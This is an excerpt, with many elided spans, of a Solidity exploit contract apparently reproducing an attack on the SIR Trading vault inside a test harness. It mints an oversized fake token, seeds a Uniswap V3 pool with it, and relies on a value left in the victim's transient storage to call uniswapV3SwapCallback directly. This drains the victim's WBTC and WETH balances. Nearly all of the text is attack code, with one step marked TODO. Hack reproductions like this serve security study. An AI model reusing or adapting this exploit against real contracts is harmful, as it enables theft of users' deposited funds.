...
contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20 {
    constructor() ERC20("TokenA", "A") {
        _mint(address(this), 200_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000);
    }
    ...
    IImmutableCreate2Factory internal constant factory =
    ...
    function test_attack() external {
        ...
        tokenB.mint(address(this), 200_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000);

        // Approve the victim contract to spend the debt token
        //tokenB.approve(address(victim), type(uint256).max);
        tokenB.approve(address(victim), 200_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000_000);
        ...
        tokenB.approve(address(positionManager), 108_823_205_127_466_839_754_387_550_950_703);

        // Approve the Uniswap pool to spend this contract's token
        IERC20(address(this)).approve(address(positionManager), 108_823_205_127_466_839_754_387_550_957_989);
        ...
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                ...
                tickLower: -190_000,
                tickUpper: 190_000,
                amount0Desired: 108_823_205_127_466_839_754_387_550_950_703,
                amount1Desired: 108_823_205_127_466_839_754_387_550_957_989,
                amount0Min: 0,
                amount1Min: 0,
        ...
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            ...
            recipient: address(this),
            deadline: block.timestamp + 1,
            amountIn: 114_814_730_000_000_000_000_000_000_000_000_000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        ...
        uint256 amountIn = quoter.quoteExactOutputSingle(
            ...
            100, // fee
            uint144((targetAmount * 12_000) / 10_000), // amountOut
            0 // sqrtPriceLimitX96
        );

        // Mint APE tokens
        // Here, tokensToMint is still in the slot 1 of the transient storage of the victim contract
        // safeguarding the uniswapV3SwapCallback function. We need to find an address that has the same value
        // and
        ...
        //TODO: Here we should use create2 and deploy a contract with a precalculated address that has the
        // same value as tokensMinted
        // bytes32 salt = 0;
        ...
        // Wbtc Data
        bytes memory data =
            abi.encode(msg.sender, address(this), vaultParamsWbtc, vaultState, reserves, false, true);

        uint256 wbtcBalance = wbtc.balanceOf(address(victim));
        victim.uniswapV3SwapCallback(0, int256(wbtcBalance), data);
        ...
        victim.uniswapV3SwapCallback(0, int256(wethBalanceVictim), data);
    ...
    function mint(
        ...
        // The important thing here is that it returns its own address as the amount so it can keep calling
        // the uniswapV3SwapCallback function
        newReserves = IVault.Reserves({reserveApes: 10_000_000_000, reserveLPers: 0, tickPriceX42: 0});
        // newReserves = reserves;
        fees = IVault.Fees({collateralInOrWithdrawn: 0, collateralFeeToStakers: 0, collateralFeeToLPers: 0});
